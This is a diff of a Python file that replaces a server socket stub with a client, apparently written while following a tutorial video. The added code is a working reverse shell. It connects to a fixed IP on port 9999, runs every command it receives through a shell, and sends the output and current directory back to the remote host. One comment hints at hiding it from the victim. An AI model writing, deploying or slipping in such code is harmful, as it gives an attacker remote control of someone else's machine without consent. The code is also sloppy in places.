@@ -1,27 +1,28 @@
-#got em
-
-import socket #two computer can communicate
-import sys # can run system commands
-
-# Create a socket (allows computers to connect)
-# Client needs the IP of the server
-def socket_create(): #create a function called socket_create
-    try: #try/catch
-        global host #ip address where you connect to
-        global port #port is a way where data is coming in (helps undefentify)
-        global s
-        host = ''
-        port = 9999 #try not to use the common port for testing
-        s = socket.socket() #s is where /socket or conversation between the computers/servers and target machine.
-    except socket.error as msg:
-        print("socket creation error: " +str(msg))
+#connects to server and waits fi instrucitons
 
 
-#bind socket to port and wait for connection from a client
-def socket_bind():
-    try:
-        global host
-        global port
-        global s
-        print("Binding socket to port: " + str(port))#you have to convert the port to the string
-        s.bind((host, port))
+import os #access the operating systems
+import socket #connect to serever
+import subprocess #allows to control of the Operating System onof target machine
+
+s = socket.socket()#compiter can connect to other computers
+host = '172.18.0.1'
+port = 9999
+s.connect((host,port))#bind the network
+
+#video 4
+while True:
+    data = s.recv(1024)#1024 buffer size
+    if data[:2].decode("utf-8") == 'cd': #convert byte to string
+        os.chdir(data[3:].decode("utf-8"))#os = access operating systrm
+    if len(data) > 0:
+        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,  stderr=subprocess.PIPE,  stdin=subprocess.PIPE)#open the subpros, open a cmd from a terminal, shell shouldnt be added..
+        #takes any output puts out to standard string
+    output_bytes=cmd.stdout.read()+cmd.stderr.read()
+        #output_bytes = cmd.stdout.read()+cmd.strderr.read()
+    output_str = str(output_bytes, "utf-8")
+    s.send(str.encode(output_str + str(os.getcwd())  + ">"))#get current directory
+    print(output_str)#if ur hidoi hito dont print
+
+#   close conekktion
+s.close()
